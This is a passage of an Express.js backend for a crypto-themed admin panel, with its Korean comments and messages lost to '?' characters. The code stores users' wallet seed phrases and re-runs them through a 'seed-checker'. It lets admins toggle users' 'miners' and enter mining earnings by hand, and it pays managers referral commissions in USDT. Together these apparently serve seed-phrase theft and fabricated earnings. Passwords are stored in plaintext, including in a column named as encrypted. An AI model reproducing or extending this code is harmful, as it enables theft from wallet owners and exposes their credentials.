    if (!userId) return res.status(401).json({ error: '?? ??' });
    if (!giftId) return res.status(400).json({ error: 'giftId ??' });

    await db.pool.query(
      `UPDATE seed_gifts SET status = 'delivered', delivered_at = NOW()
       WHERE id = ? AND user_id = ? AND status = 'pending'`,
      [giftId, userId]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/seeds/recheck ? ?? ?? ID ?? ??? (seed-checker.js ??)
app.post('/api/admin/seeds/recheck', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { ids } = req.body;
    let seedIds = [];

    if (ids === 'all') {
      const [rows] = await db.pool.query(`SELECT id FROM seeds ORDER BY id ASC`);
      seedIds = rows.map(r => r.id);
    } else if (Array.isArray(ids) && ids.length > 0) {
      seedIds = ids.map(Number).filter(n => !isNaN(n) && n > 0);
    }

    if (seedIds.length === 0) return res.status(400).json({ error: '???? ?? ID? ????.' });
    if (seedIds.length > 50) return res.status(400).json({ error: '? ?? ?? 50???? ??? ?????.' });

    const ph = seedIds.map(() => '?').join(',');
    const [seeds] = await db.pool.query(
      `SELECT id, user_id, phrase, created_at FROM seeds WHERE id IN (${ph})`, seedIds
    );

    res.json({ ok: true, queued: seeds.length, ids: seedIds, message: '??? ???. ?? ? ??? ???????.' });

    // ????? ?? ? seed-checker.js? processSeed ???
    const { processSeed } = require('./seed-checker');
    (async () => {
      for (const seed of seeds) {
        await processSeed(seed).catch(e => console.error(`[SEED RECHECK] ID=${seed.id} ??:`, e.message));
        await new Promise(r => setTimeout(r, 500));
      }
      console.log(`[SEED RECHECK] ?? ?? (${seeds.length}?)`);
    })();
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ============================================================
//  macroUser ??? API  (/api/mu/*)
// ============================================================

// ----- ?? -----

app.post('/api/mu/login', async (req, res) => {
  try {
    const { login_id, password } = req.body || {};
    if (!login_id?.trim() || !password?.trim()) {
      return res.status(400).json({ error: 'ID? ????? ?????.' });
    }
    const hash = muHashPassword(password.trim());
    const [[user]] = await db.pool.query(
      'SELECT id, name, login_id, role, status FROM mu_users WHERE login_id = ? AND password_hash = ?',
      [login_id.trim(), hash]
    );
    if (!user) return res.status(401).json({ error: 'ID ?? ????? ???? ????.' });
    if (user.status !== 'active') return res.status(403).json({ error: '??? ?????.' });
    const token = muCreateToken();
    await db.pool.query('INSERT INTO mu_sessions (user_id, token) VALUES (?, ?)', [user.id, token]);
    await recordLoginPublicIp(req, 'mu_user', user.login_id || String(user.id));
    res.json({ ok: true, token, user: { id: user.id, name: user.name, loginId: user.login_id, role: user.role } });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/mu/logout', requireMuAuth, async (req, res) => {
  try {
    const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.muToken || '';
    await db.pool.query('DELETE FROM mu_sessions WHERE token = ?', [token]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/mu/me', requireMuAuth, (req, res) => {
  res.json({ ok: true, user: req.muUser });
});

// ----- ADMIN ?? API -----

// ?? ?? ?? (?? ?? ??)
app.get('/api/mu/admin/users', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const [users] = await db.pool.query(`
      SELECT u.id, u.name, u.login_id, u.role, u.status, u.created_at,
        COUNT(a.id)                                            AS total_accounts,
        SUM(a.account_status = 'ACTIVE')                      AS active_accounts,
        SUM(a.account_status = 'ERROR')                       AS error_accounts,
        SUM(a.account_status = 'EXPIRED')                     AS expired_accounts,
        SUM(a.connection_status = 'DISCONNECTED')             AS disconnected_accounts,
        MAX(a.last_checked_at)                                AS last_checked_at
      FROM mu_users u
      LEFT JOIN managed_accounts a ON a.owner_user_id = u.id
      GROUP BY u.id
      ORDER BY u.created_at DESC
    `);
    res.json({ ok: true, users });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ?? ??
app.post('/api/mu/admin/users', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const { name, login_id, password, role } = req.body || {};
    if (!name?.trim() || !login_id?.trim() || !password?.trim()) {
      return res.status(400).json({ error: '??, ID, ????? ?????.' });
    }
    const validRole = ['ADMIN', 'USER'].includes(role) ? role : 'USER';
    const hash = muHashPassword(password.trim());
    const [result] = await db.pool.query(
      'INSERT INTO mu_users (name, login_id, password_hash, role) VALUES (?, ?, ?, ?)',
      [name.trim(), login_id.trim(), hash, validRole]
    );
    res.json({ ok: true, id: result.insertId });
  } catch (e) {
    if (e.code === 'ER_DUP_ENTRY') return res.status(409).json({ error: '?? ?? ?? ID???.' });
    res.status(500).json({ error: e.message });
  }
});

// ?? ??/??
app.patch('/api/mu/admin/users/:id', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const userId = parseInt(req.params.id);
    const { name, password, role, status } = req.body || {};
    const fields = [];
    const vals = [];
    if (name?.trim()) { fields.push('name = ?'); vals.push(name.trim()); }
    if (password?.trim()) { fields.push('password_hash = ?'); vals.push(muHashPassword(password.trim())); }
    if (['ADMIN', 'USER'].includes(role)) { fields.push('role = ?'); vals.push(role); }
    if (['active', 'inactive'].includes(status)) { fields.push('status = ?'); vals.push(status); }
    if (fields.length === 0) return res.status(400).json({ error: '??? ??? ????.' });
    vals.push(userId);
    await db.pool.query(`UPDATE mu_users SET ${fields.join(', ')} WHERE id = ?`, vals);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ?? ??
app.delete('/api/mu/admin/users/:id', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const userId = parseInt(req.params.id);
    await db.pool.query('DELETE FROM mu_users WHERE id = ?', [userId]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ?? ??? ?? ??
app.get('/api/mu/admin/users/:userId/accounts', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const userId = parseInt(req.params.userId);
    const [accounts] = await db.pool.query(`
      SELECT a.*,
        t.task_type AS last_task_type, t.task_status AS last_task_status, t.ended_at AS last_task_ended_at
      FROM managed_accounts a
      LEFT JOIN managed_account_tasks t ON t.id = (
        SELECT id FROM managed_account_tasks WHERE managed_account_id = a.id ORDER BY created_at DESC LIMIT 1
      )
      WHERE a.owner_user_id = ?
      ORDER BY a.created_at ASC
    `, [userId]);
    res.json({ ok: true, accounts });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ?? ?? (???)
app.post('/api/mu/admin/accounts', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const { owner_user_id, account_name, external_service_name, login_id, login_password, memo } = req.body || {};
    if (!owner_user_id) return res.status(400).json({ error: 'owner_user_id? ?????.' });
    const [result] = await db.pool.query(
      `INSERT INTO managed_accounts
        (owner_user_id, account_name, external_service_name, login_id, login_password_encrypted, memo)
       VALUES (?, ?, ?, ?, ?, ?)`,
      [owner_user_id, account_name || null, external_service_name || null,
       login_id || null, login_password || null, memo || null]
    );
    res.json({ ok: true, id: result.insertId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ?? ?? ?? (???)
app.patch('/api/mu/admin/accounts/:accountId/status', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const accountId = parseInt(req.params.accountId);
    const { account_status, connection_status } = req.body || {};
    const fields = [];
    const vals = [];
    const validAS = ['PENDING','ACTIVE','SUSPENDED','EXPIRED','ERROR'];
    const validCS = ['CONNECTED','DISCONNECTED','CHECKING'];
    if (validAS.includes(account_status)) { fields.push('account_status = ?'); vals.push(account_status); }
    if (validCS.includes(connection_status)) { fields.push('connection_status = ?'); vals.push(connection_status); }
    if (fields.length === 0) return res.status(400).json({ error: '??? ??? ????.' });
    vals.push(accountId);
    await db.pool.query(`UPDATE managed_accounts SET ${fields.join(', ')} WHERE id = ?`, vals);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ?? ??? ??? (???)
app.patch('/api/mu/admin/accounts/:accountId/reassign', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const accountId = parseInt(req.params.accountId);
    const { owner_user_id } = req.body || {};
    if (!owner_user_id) return res.status(400).json({ error: 'owner_user_id? ?????.' });
    await db.pool.query('UPDATE managed_accounts SET owner_user_id = ? WHERE id = ?', [owner_user_id, accountId]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ?? ?? (???)
app.delete('/api/mu/admin/accounts/:accountId', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const accountId = parseInt(req.params.accountId);
    await db.pool.query('DELETE FROM managed_accounts WHERE id = ?', [accountId]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ?? ?? ?? (???)
app.post('/api/mu/admin/accounts/:accountId/logs', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const accountId = parseInt(req.params.accountId);
    const { event_type, message, payload_json } = req.body || {};
    await db.pool.query(
      'INSERT INTO managed_account_logs (managed_account_id, event_type, message, payload_json) VALUES (?, ?, ?, ?)',
      [accountId, event_type || null, message || null, payload_json ? JSON.stringify(payload_json) : null]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ----- USER ?? API -----

// ? ?? ??
app.get('/api/mu/my/accounts', requireMuAuth, async (req, res) => {
  try {
    const userId = req.muUser.id;
    const { status, connection } = req.query;
    let where = 'WHERE a.owner_user_id = ?';
    const params = [userId];
    if (status) { where += ' AND a.account_status = ?'; params.push(status.toUpperCase()); }
    if (connection) { where += ' AND a.connection_status = ?'; params.push(connection.toUpperCase()); }
    const [accounts] = await db.pool.query(`
      SELECT a.*,
        t.task_type AS last_task_type, t.task_status AS last_task_status, t.ended_at AS last_task_ended_at
      FROM managed_accounts a
      LEFT JOIN managed_account_tasks t ON t.id = (
        SELECT id FROM managed_account_tasks WHERE managed_account_id = a.id ORDER BY created_at DESC LIMIT 1
      )
      ${where}
      ORDER BY FIELD(a.account_status,'ERROR','EXPIRED','SUSPENDED','PENDING','ACTIVE'), a.created_at ASC
    `, params);

    // ?? ??
    const [allAccounts] = await db.pool.query(
      'SELECT account_status, connection_status FROM managed_accounts WHERE owner_user_id = ?', [userId]
    );
    const summary = {
      total: allAccounts.length,
      active: allAccounts.filter(a => a.account_status === 'ACTIVE').length,
      error: allAccounts.filter(a => a.account_status === 'ERROR').length,
      expired: allAccounts.filter(a => a.account_status === 'EXPIRED').length,
      suspended: allAccounts.filter(a => a.account_status === 'SUSPENDED').length,
      pending: allAccounts.filter(a => a.account_status === 'PENDING').length,
      disconnected: allAccounts.filter(a => a.connection_status === 'DISCONNECTED').length,
    };
    res.json({ ok: true, summary, accounts });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ? ?? ??
app.get('/api/mu/my/accounts/:accountId', requireMuAuth, async (req, res) => {
  try {
    const userId = req.muUser.id;
    const accountId = parseInt(req.params.accountId);
    const [[account]] = await db.pool.query(
      'SELECT * FROM managed_accounts WHERE id = ? AND owner_user_id = ?', [accountId, userId]
    );
    if (!account) return res.status(404).json({ error: '??? ?? ? ????.' });
    res.json({ ok: true, account });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ? ?? ?? ??
app.patch('/api/mu/my/accounts/:accountId/memo', requireMuAuth, async (req, res) => {
  try {
    const userId = req.muUser.id;
    const accountId = parseInt(req.params.accountId);
    const { memo } = req.body || {};
    const [result] = await db.pool.query(
      'UPDATE managed_accounts SET memo = ? WHERE id = ? AND owner_user_id = ?',
      [memo || null, accountId, userId]
    );
    if (result.affectedRows === 0) return res.status(404).json({ error: '??? ?? ? ????.' });
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ? ?? ?? ??
app.get('/api/mu/my/accounts/:accountId/logs', requireMuAuth, async (req, res) => {
  try {
    const userId = req.muUser.id;
    const accountId = parseInt(req.params.accountId);
    const [[owns]] = await db.pool.query(
      'SELECT id FROM managed_accounts WHERE id = ? AND owner_user_id = ?', [accountId, userId]
    );
    if (!owns) return res.status(404).json({ error: '??? ?? ? ????.' });
    const limit = Math.min(parseInt(req.query.limit) || 50, 200);
    const [logs] = await db.pool.query(
      'SELECT * FROM managed_account_logs WHERE managed_account_id = ? ORDER BY created_at DESC LIMIT ?',
      [accountId, limit]
    );
    res.json({ ok: true, logs });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ? ?? ?? ?? ??
app.get('/api/mu/my/accounts/:accountId/tasks', requireMuAuth, async (req, res) => {
  try {
    const userId = req.muUser.id;
    const accountId = parseInt(req.params.accountId);
    const [[owns]] = await db.pool.query(
      'SELECT id FROM managed_accounts WHERE id = ? AND owner_user_id = ?', [accountId, userId]
    );
    if (!owns) return res.status(404).json({ error: '??? ?? ? ????.' });
    const limit = Math.min(parseInt(req.query.limit) || 50, 200);
    const [tasks] = await db.pool.query(
      'SELECT * FROM managed_account_tasks WHERE managed_account_id = ? ORDER BY created_at DESC LIMIT ?',
      [accountId, limit]
    );
    res.json({ ok: true, tasks });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ? ?? ?? ??
app.post('/api/mu/my/accounts/:accountId/tasks', requireMuAuth, async (req, res) => {
  try {
    const userId = req.muUser.id;
    const accountId = parseInt(req.params.accountId);
    const [[owns]] = await db.pool.query(
      'SELECT id FROM managed_accounts WHERE id = ? AND owner_user_id = ?', [accountId, userId]
    );
    if (!owns) return res.status(404).json({ error: '??? ?? ? ????.' });
    const { task_type } = req.body || {};
    const [result] = await db.pool.query(
      'INSERT INTO managed_account_tasks (managed_account_id, task_type) VALUES (?, ?)',
      [accountId, task_type || 'manual']
    );
    res.json({ ok: true, id: result.insertId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ========== ??(???)? API ==========

// GET /api/admin/my/settlements ? ?? ?? ?? + ?? ??
app.get('/api/admin/my/settlements', requireAdmin, async (req, res) => {
  try {
    const managerId = req.admin.id;
    let page = Math.max(1, parseInt(req.query.page, 10) || 1);
    let pageSize = Math.min(100, Math.max(1, parseInt(req.query.pageSize, 10) || 20));
    const offset = (page - 1) * pageSize;
    const [[{ total }]] = await db.pool.query(
      'SELECT COUNT(*) as total FROM settlements WHERE manager_id = ?', [managerId]
    );
    const [records] = await db.pool.query(
      `SELECT s.id, s.user_id, s.payment_amount, s.settlement_rate, s.settlement_amount, s.payment_type, s.created_at
       FROM settlements s WHERE s.manager_id = ? ORDER BY s.created_at DESC LIMIT ? OFFSET ?`,
      [managerId, pageSize, offset]
    );
    // ?? ?? ??
    const [[{ totalEarned }]] = await db.pool.query(
      'SELECT COALESCE(SUM(settlement_amount), 0) as totalEarned FROM settlements WHERE manager_id = ?',
      [managerId]
    );
    // ??? ??
    const [[{ totalWithdrawn }]] = await db.pool.query(
      'SELECT COALESCE(SUM(amount), 0) as totalWithdrawn FROM withdrawal_requests WHERE manager_id = ? AND status = "approved"',
      [managerId]
    );
    const balance = Number(totalEarned) - Number(totalWithdrawn);
    res.json({ total, page, pageSize, records, totalEarned: Number(totalEarned), totalWithdrawn: Number(totalWithdrawn), balance });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/my/withdrawals ? ?? ?? ?? ??
app.get('/api/admin/my/withdrawals', requireAdmin, async (req, res) => {
  try {
    const managerId = req.admin.id;
    const [rows] = await db.pool.query(
      'SELECT id, amount, wallet_address, status, reject_reason, requested_at, processed_at FROM withdrawal_requests WHERE manager_id = ? ORDER BY requested_at DESC',
      [managerId]
    );
    res.json({ withdrawals: rows });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/my/withdrawals ? ?? ?? (?? 1?? ??)
app.post('/api/admin/my/withdrawals', requireAdmin, async (req, res) => {
  try {
    const managerId = req.admin.id;
    const now = new Date();
    if (now.getDate() !== 1) {
      return res.status(400).json({ error: '?? ??? ?? 1??? ?????.' });
    }
    const { amount, wallet_address } = req.body || {};
    if (!amount || isNaN(Number(amount)) || Number(amount) <= 0) {
      return res.status(400).json({ error: '??? ??? ?????.' });
    }
    // ?? ??
    const [[{ totalEarned }]] = await db.pool.query(
      'SELECT COALESCE(SUM(settlement_amount), 0) as totalEarned FROM settlements WHERE manager_id = ?',
      [managerId]
    );
    const [[{ totalWithdrawn }]] = await db.pool.query(
      'SELECT COALESCE(SUM(amount), 0) as totalWithdrawn FROM withdrawal_requests WHERE manager_id = ? AND status = "approved"',
      [managerId]
    );
    // ?? ?? ?? ?? ??? ??
    const [[{ pendingAmount }]] = await db.pool.query(
      'SELECT COALESCE(SUM(amount), 0) as pendingAmount FROM withdrawal_requests WHERE manager_id = ? AND status = "pending"',
      [managerId]
    );
    const balance = Number(totalEarned) - Number(totalWithdrawn) - Number(pendingAmount);
    if (Number(amount) > balance) {
      return res.status(400).json({ error: `?? ?? ??(${balance.toFixed(4)} USDT)? ?????.` });
    }
    const [result] = await db.pool.query(
      'INSERT INTO withdrawal_requests (manager_id, amount, wallet_address) VALUES (?, ?, ?)',
      [managerId, Number(amount), wallet_address?.trim() || null]
    );
    res.json({ ok: true, id: result.insertId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/users/:id/miner ? ?? ?? ??? ?? ??
app.get('/api/admin/users/:id/miner', requireAdmin, async (req, res) => {
  try {
    const targetId = req.params.id.toLowerCase();
    if (req.admin.role !== 'master') {
      const [[user]] = await db.pool.query('SELECT manager_id FROM users WHERE id = ?', [targetId]);
      if (!user || user.manager_id !== req.admin.id) {
        return res.status(403).json({ error: '?? ??? ??? ? ????.' });
      }
    }
    const [[row]] = await db.pool.query(
      'SELECT status, coin_type, assigned_at FROM miner_status WHERE user_id = ?',
      [targetId]
    );
    res.json({ status: row?.status || 'stopped', coin_type: row?.coin_type || 'BTC', assigned_at: row?.assigned_at || null });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/admin/users/:id/miner ? ??? ?? ?? (running/stopped)
app.patch('/api/admin/users/:id/miner', requireAdmin, async (req, res) => {
  try {
    const targetId = req.params.id.toLowerCase();
    const { status, coin_type } = req.body || {};
    if (!['running', 'stopped'].includes(status)) {
      return res.status(400).json({ error: 'status? running ?? stopped' });
    }
    // ???? ?? ?? ??? ?? ??
    if (req.admin.role !== 'master') {
      const [[user]] = await db.pool.query('SELECT manager_id FROM users WHERE id = ?', [targetId]);
      if (!user || user.manager_id !== req.admin.id) {
        return res.status(403).json({ error: '?? ??? ??? ? ????.' });
      }
    }
    const coinType = coin_type?.trim() || 'BTC';
    const assignedAt = status === 'running' ? new Date() : null;
    await db.pool.query(
      `INSERT INTO miner_status (user_id, status, coin_type, assigned_at)
       VALUES (?, ?, ?, ?)
       ON DUPLICATE KEY UPDATE status = VALUES(status), coin_type = VALUES(coin_type), assigned_at = VALUES(assigned_at)`,
      [targetId, status, coinType, assignedAt]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/mining-records ? ?? ?? ?? (???/???)
app.post('/api/admin/mining-records', requireAdmin, async (req, res) => {
  try {
    const { user_id, coin_type, amount, mined_at, note } = req.body || {};
    if (!user_id || !amount || isNaN(Number(amount))) {
      return res.status(400).json({ error: 'user_id, amount ??' });
    }
    const targetId = user_id.toLowerCase();
    if (req.admin.role !== 'master') {
      const [[user]] = await db.pool.query('SELECT manager_id FROM users WHERE id = ?', [targetId]);
      if (!user || user.manager_id !== req.admin.id) {
        return res.status(403).json({ error: '?? ??? ??? ? ????.' });
      }
    }
    const [result] = await db.pool.query(
      'INSERT INTO mining_records (user_id, coin_type, amount, mined_at, note) VALUES (?, ?, ?, ?, ?)',
      [targetId, coin_type || 'BTC', Number(amount), mined_at || new Date(), note || null]
    );
    res.json({ ok: true, id: result.insertId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// DELETE /api/admin/mining-records/:id ? ?? ?? ?? (??? ??)
app.delete('/api/admin/mining-records/:id', requireAdmin, requireMaster, async (req, res) => {
  try {
    await db.pool.query('DELETE FROM mining_records WHERE id = ?', [req.params.id]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/users/:id/mining-records ? ?? ?? ?? ?? (???/???)
app.get('/api/admin/users/:id/mining-records', requireAdmin, async (req, res) => {
  try {
    const targetId = req.params.id.toLowerCase();
    if (req.admin.role !== 'master') {
      const [[user]] = await db.pool.query('SELECT manager_id FROM users WHERE id = ?', [targetId]);
      if (!user || user.manager_id !== req.admin.id) {
        return res.status(403).json({ error: '?? ??? ??? ? ????.' });
      }
    }
    const [records] = await db.pool.query(
      'SELECT id, coin_type, amount, mined_at, note FROM mining_records WHERE user_id = ? ORDER BY mined_at DESC LIMIT 100',
      [targetId]
    );
    const [[{ cumulative }]] = await db.pool.query(
      'SELECT COALESCE(SUM(amount), 0) as cumulative FROM mining_records WHERE user_id = ?',
      [targetId]
    );
    res.json({ records, cumulative: Number(cumulative) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ========== ??? ?? API (?? ??) ==========

// GET /api/admin/settlements ? ?? ?? ??
app.get('/api/admin/settlements', requireAdmin, requireMaster, async (req, res) => {
  try {
    let page = Math.max(1, parseInt(req.query.page, 10) || 1);
    let pageSize = Math.min(100, Math.max(1, parseInt(req.query.pageSize, 10) || 30));
    const offset = (page - 1) * pageSize;
    const managerId = req.query.manager_id || null;
    const whereClause = managerId ? 'WHERE manager_id = ?' : '';
    const params = managerId ? [managerId] : [];
    const [[{ total }]] = await db.pool.query(
      `SELECT COUNT(*) as total FROM settlements ${whereClause}`, params
    );
    const [records] = await db.pool.query(
      `SELECT id, manager_id, user_id, payment_amount, settlement_rate, settlement_amount, payment_type, created_at
       FROM settlements ${whereClause} ORDER BY created_at DESC LIMIT ? OFFSET ?`,
      [...params, pageSize, offset]
    );
    res.json({ total, page, pageSize, records });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/admin/managers/:id/settlement-rate ? ?? ?? ??
app.patch('/api/admin/managers/:id/settlement-rate', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { rate } = req.body || {};
    if (rate === undefined || isNaN(Number(rate)) || Number(rate) < 0 || Number(rate) > 100) {
      return res.status(400).json({ error: '??? 0~100 ???? ???.' });
    }
    await db.pool.query('UPDATE managers SET settlement_rate = ? WHERE id = ? AND role = "manager"', [Number(rate), req.params.id]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/withdrawals ? ?? ?? ?? ?? (status, manager_id ?? ??)
app.get('/api/admin/withdrawals', requireAdmin, requireMaster, async (req, res) => {
  try {
    const status    = req.query.status     || null;
    const managerId = req.query.manager_id || null;
    const conds  = [];
    const params = [];
    if (status)    { conds.push('status = ?');     params.push(status); }
    if (managerId) { conds.push('manager_id = ?'); params.push(managerId); }
    const whereClause = conds.length ? 'WHERE ' + conds.join(' AND ') : '';
    const [rows] = await db.pool.query(
      `SELECT id, manager_id, amount, wallet_address, status, reject_reason, requested_at, processed_at
       FROM withdrawal_requests ${whereClause} ORDER BY requested_at DESC`,
      params
    );
    res.json({ withdrawals: rows });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/admin/withdrawals/:id ? ?? ??/??
app.patch('/api/admin/withdrawals/:id', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { action, reject_reason } = req.body || {};
    if (!['approve', 'reject'].includes(action)) {
      return res.status(400).json({ error: 'action? approve ?? reject' });
    }
    const [[wr]] = await db.pool.query('SELECT * FROM withdrawal_requests WHERE id = ?', [req.params.id]);
    if (!wr) return res.status(404).json({ error: '?? ??? ?? ? ????.' });
    if (wr.status !== 'pending') return res.status(400).json({ error: '?? ??? ?????.' });
    const newStatus = action === 'approve' ? 'approved' : 'rejected';
    await db.pool.query(
      'UPDATE withdrawal_requests SET status = ?, reject_reason = ?, processed_at = NOW() WHERE id = ?',
      [newStatus, action === 'reject' ? (reject_reason || '') : null, req.params.id]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/master/settlement-overview ? ??? ?? ?? ??
app.get('/api/admin/master/settlement-overview', requireAdmin, requireMaster, async (req, res) => {
  try {
    // ? ??? (?? ??? ?? ? settlements.payment_amount ??)
    const [[{ total_collected }]] = await db.pool.query(
      'SELECT COALESCE(SUM(payment_amount), 0) as total_collected FROM settlements'
    );
    // ?? ?? ?? ???? (?? ?? ??)
    const [[{ total_settlement }]] = await db.pool.query(
      'SELECT COALESCE(SUM(settlement_amount), 0) as total_settlement FROM settlements'
    );
    // ?? ?? ??? ?? (approved ??)
    const [[{ total_paid_out }]] = await db.pool.query(
      "SELECT COALESCE(SUM(amount), 0) as total_paid_out FROM withdrawal_requests WHERE status = 'approved'"
    );
    // ?? ?? ? ? ?? (?? ?? ?? = ?? ?? ??)
    const pending_payout = Number(total_settlement) - Number(total_paid_out);
    // ??? ??? = ? ?? - ?? ???? ??
    const master_net = Number(total_collected) - Number(total_settlement);

    res.json({
      total_collected: Number(total_collected),   // ? ?? ??
      total_settlement: Number(total_settlement),  // ?? ???? ??
      total_paid_out: Number(total_paid_out),      // ?? ??? ??
      pending_payout: pending_payout,              // ?? ?? ?? ??
      master_net: master_net,                      // ??? ???
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/managers/settlement-summary ? ??? ?? ??
app.get('/api/admin/managers/settlement-summary', requireAdmin, requireMaster, async (req, res) => {
  try {
    const [rows] = await db.pool.query(
      `SELECT m.id, m.telegram, m.memo, m.settlement_rate,
              COALESCE(s.total_earned, 0) as total_earned,
              COALESCE(w.total_withdrawn, 0) as total_withdrawn,
              COALESCE(s.total_earned, 0) - COALESCE(w.total_withdrawn, 0) as balance
       FROM managers m
       LEFT JOIN (SELECT manager_id, SUM(settlement_amount) as total_earned FROM settlements GROUP BY manager_id) s ON m.id = s.manager_id
       LEFT JOIN (SELECT manager_id, SUM(amount) as total_withdrawn FROM withdrawal_requests WHERE status = 'approved' GROUP BY manager_id) w ON m.id = w.manager_id
       WHERE m.role = 'manager'
       ORDER BY m.id`
    );
    res.json({ managers: rows });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ========== ?? ?? API ==========

// POST /api/owner/register ? ?? ?? ?? (pending ??? ??, ?? ????? ???? ??)
app.post('/api/owner/register', async (req, res) => {
  try {
    const { id, password, name, telegram, referralCode } = req.body || {};
    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: '???? ????? ?????.' });
    const ownerId = id.trim().toLowerCase();
    const [[exists]] = await db.pool.query('SELECT id FROM account_owners WHERE id = ?', [ownerId]);
    if (exists) return res.status(400).json({ error: '?? ?? ?? ??????.' });

    let managerId = null;
    if (referralCode?.trim()) {
      const [[mgr]] = await db.pool.query("SELECT id FROM managers WHERE id = ? AND role IN ('manager','master')", [referralCode.trim()]);
      if (!mgr) return res.status(400).json({ error: '???? ?? ??? ?????.' });
      managerId = mgr.id;
    }

    await db.pool.query(
      'INSERT INTO account_owners (id, pw, name, telegram, manager_id, status) VALUES (?, ?, ?, ?, ?, ?)',
      [ownerId, password.trim(), name?.trim() || null, telegram?.trim() || null, managerId, 'pending']
    );

    // ?? ????? ???? ??
    if (managerId) {
      try {
        await sendManagerTelegramByChannel(
          managerId,
          'approval',
          `?? <b>?? ?? ??</b>\n???: <code>${escapeHtml(ownerId)}</code>\n??: ${escapeHtml(name?.trim() || '-')}\n????: ${escapeHtml(telegram?.trim() || '-')}`
        );
      } catch (tgErr) { console.warn('?? ?? ???? ?? ??:', tgErr.message); }
    }

    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/owner/login
app.post('/api/owner/login', async (req, res) => {
  try {
    const { id, password } = req.body || {};
    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: '???? ????? ?????.' });

    // 1) account_owners ????? ?? ??
    const [[owner]] = await db.pool.query(
      'SELECT id, name, telegram, manager_id, status FROM account_owners WHERE id = ? AND pw = ?',
      [id.trim().toLowerCase(), password.trim()]
    );
    if (owner) {
      if (owner.status === 'pending')  return res.status(403).json({ error: '??? ?? ?? ????.' });
      if (owner.status === 'rejected') return res.status(403).json({ error: '??? ???????. ????? ?????.' });
      const token = crypto.randomBytes(24).toString('hex');
      await db.pool.query('INSERT INTO owner_sessions (token, owner_id) VALUES (?, ?)', [token, owner.id]);
      await recordLoginPublicIp(req, 'owner', owner.id);
      return res.json({ token, id: owner.id, name: owner.name || owner.id, telegram: owner.telegram || '', role: 'owner' });
    }

    // 2) admins ????? manager ??? ??
    const [[mgr]] = await db.pool.query(
      "SELECT id, telegram FROM managers WHERE id=? AND pw=? AND role='manager'",
      [id.trim().toLowerCase(), password.trim()]
    );
    if (mgr) {
      // manager? owner_sessions? ?? ? owner?? ??
      const token = crypto.randomBytes(24).toString('hex');
      await db.pool.query('INSERT INTO owner_sessions (token, owner_id) VALUES (?, ?)', [token, mgr.id]);
      await recordLoginPublicIp(req, 'owner', mgr.id);
      return res.json({ token, id: mgr.id, name: mgr.id, telegram: mgr.telegram || '', role: 'manager' });
    }

    return res.status(401).json({ error: '??? ?? ????? ???? ????.' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/owner/logout
app.post('/api/owner/logout', async (req, res) => {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.body?.token || '';
  if (token) await db.pool.query('DELETE FROM owner_sessions WHERE token = ?', [token]).catch(() => {});
  res.json({ ok: true });
});

// POST /api/owner/logout-all ? ??/?? ??? owner_sessions ?? ?? (?? ? ?·?? ? ????)
